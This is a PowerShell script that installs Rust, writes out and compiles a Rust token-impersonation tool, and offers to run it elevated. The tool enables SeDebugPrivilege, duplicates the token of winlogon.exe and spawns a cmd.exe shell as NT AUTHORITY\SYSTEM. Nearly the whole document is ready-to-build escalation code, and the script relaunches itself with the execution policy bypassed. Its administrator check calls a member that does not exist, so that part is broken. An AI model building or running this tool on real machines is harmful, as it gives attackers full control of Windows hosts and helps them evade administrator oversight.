# build_runassystem.ps1
# Full automation: Install Rust → Create project → Build → Run as SYSTEM
# Author: kizrrum | RunAsSystem

Write-Host "[*] Checking Rust installation..." -ForegroundColor Green

# 1. Проверяем, установлен ли Rust
$rustc = Get-Command rustc -ErrorAction SilentlyContinue
$cargo = Get-Command cargo -ErrorAction SilentlyContinue

if (-not $rustc -or -not $cargo) {
    Write-Host "[*] Rust not found. Installing rustup..." -ForegroundColor Yellow
    $url = "https://win.rustup.rs/x86_64"
    $installer = "$env:TEMP\rustup-init.exe"
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $installer
        Write-Host "[*] Running rustup installer (quiet mode)..." -ForegroundColor Yellow
        Start-Process -FilePath $installer -ArgumentList "-y" -Wait
        $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "User")
        Write-Host "[+] Rust installed successfully!" -ForegroundColor Green
    }
    catch {
        Write-Error "[-] Failed to install Rust: $_"
        exit 1
    }
}
else {
    Write-Host "[+] Rust is already installed: $(rustc --version)" -ForegroundColor Green
}

# 2. Создаём проект
$projectPath = "$env:USERPROFILE\runassystem"
if (Test-Path $projectPath) {
    Write-Host "[*] Removing existing project..." -ForegroundColor Yellow
    Remove-Item $projectPath -Recurse -Force
}

Write-Host "[*] Creating new Rust project..." -ForegroundColor Green
cargo new $projectPath
Set-Location $projectPath

# 3. Заменяем src/main.rs
$mainRs = @'
// Invoke-TokenImpersonation.rs - Token Impersonation to NT AUTHORITY\SYSTEM
use windows::{
    core::*,
    Win32::{
        Foundation::*,
        Security::*,
        System::{
            Diagnostics::ToolHelp::*,
            Threading::*,
        },
    },
};

fn enable_debug_privilege() -> Result<()> {
    unsafe {
        let mut token_handle: HANDLE = std::mem::zeroed();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        ).is_ok() {
            let mut luid = LUID::default();
            if LookupPrivilegeValueW(None, w!("SeDebugPrivilege"), &mut luid).is_ok() {
                let mut tp = TOKEN_PRIVILEGES::default();
                tp.PrivilegeCount = 1;
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(token_handle, false, Some(&tp), 0, None, None);
            }
            let _ = CloseHandle(token_handle);
        }
    }
    Ok(())
}

fn find_process_by_name(name: &str) -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;
        let mut pe: PROCESSENTRY32W = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snapshot, &mut pe).is_ok() {
            loop {
                let exe_name: String = widestring_to_string(&pe.szExeFile);
                if exe_name.eq_ignore_ascii_case(name) {
                    let _ = CloseHandle(snapshot);
                    return Ok(pe.th32ProcessID);
                }
                if !Process32NextW(snapshot, &mut pe).is_ok() { break; }
            }
        }
        let _ = CloseHandle(snapshot);
        Err(Error::from_win32())
    }
}

fn widestring_to_string(wstr: &[u16]) -> String {
    let len = wstr.iter().position(|&c| c == 0).unwrap_or(wstr.len());
    String::from_utf16_lossy(&wstr[..len])
}

fn main() -> Result<()> {
    println!("[*] Enabling SeDebugPrivilege...");
    if let Err(e) = enable_debug_privilege() {
        eprintln!("[-] Failed to enable debug privilege: {:?}", e);
        return Err(e);
    }

    println!("[*] Finding winlogon.exe...");
    let pid = match find_process_by_name("winlogon.exe") {
        Ok(pid) => { println!("[+] Found winlogon.exe PID: {}", pid); pid }
        Err(e) => { eprintln!("[-] Could not find winlogon.exe: {:?}", e); return Err(e); }
    };

    let h_process = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)? };

    let mut h_token: HANDLE = unsafe { std::mem::zeroed() };
    if !unsafe { OpenProcessToken(h_process, TOKEN_QUERY | TOKEN_DUPLICATE, &mut h_token) }.is_ok() {
        eprintln!("[-] OpenProcessToken failed");
        return Err(Error::from_win32());
    }

    let mut h_primary_token: HANDLE = unsafe { std::mem::zeroed() };
    if !unsafe {
        DuplicateTokenEx(
            h_token,
            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
            None, SecurityImpersonation, TokenPrimary, &mut h_primary_token,
        )
    }.is_ok() {
        eprintln!("[-] DuplicateTokenEx failed");
        return Err(Error::from_win32());
    }

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    let mut cmd_line: Vec<u16> = "cmd.exe\0".encode_utf16().collect();

    let result = unsafe {
        CreateProcessWithTokenW(
            h_primary_token,
            CREATE_PROCESS_LOGON_FLAGS(0),
            None,
            PWSTR(cmd_line.as_mut_ptr()),
            CREATE_NEW_CONSOLE,
            None,
            None,
            &si,
            &mut pi,
        )
    };

    if result.is_ok() {
        println!("[+] SYSTEM shell started! PID: {}", pi.dwProcessId);
        unsafe {
            let _ = WaitForSingleObject(pi.hProcess, INFINITE);
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
        }
    } else {
        eprintln!("[-] CreateProcessWithTokenW failed: {:?}", result.as_ref().err());
        return Err(result.err().unwrap());
    }

    unsafe {
        let _ = CloseHandle(h_token);
        let _ = CloseHandle(h_primary_token);
        let _ = CloseHandle(h_process);
    }

    Ok(())
}
'@

Set-Content -Path "src/main.rs" -Value $mainRs -Encoding UTF8

# 4. Обновляем Cargo.toml
$cargoToml = @'
[package]
name = "runassystem"
version = "0.1.0"
edition = "2021"

[dependencies]
windows = { version = "0.56.0", features = [
  "Win32_Foundation",
  "Win32_Security",
  "Win32_System_Threading",
  "Win32_System_Diagnostics_ToolHelp",
] }
'@
Set-Content -Path "Cargo.toml" -Value $cargoToml -Encoding UTF8

# 5. Собираем
Write-Host "[*] Building release binary..." -ForegroundColor Green
cargo build --release

if ($LASTEXITCODE -ne 0) {
    Write-Error "[-] Build failed!"
    exit 1
}

# 6. Готово
$exe = "$projectPath\target\release\runassystem.exe"
Write-Host "[+] Build successful!" -ForegroundColor Green
Write-Host "    Binary: $exe"
Write-Host "[*] Run as Administrator to get SYSTEM shell." -ForegroundColor Yellow

# 7. Спрашиваем, запустить ли от админа
$run = Read-Host "Run as Administrator now? (Y/N)"
if ($run -match 'Y|y') {
    if (!([Security.Principal.WindowsPrincipal]::CurrentPrincipal).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File '$($MyInvocation.MyCommand.Definition)'" -Verb RunAs
        exit
    }
    & $exe
}
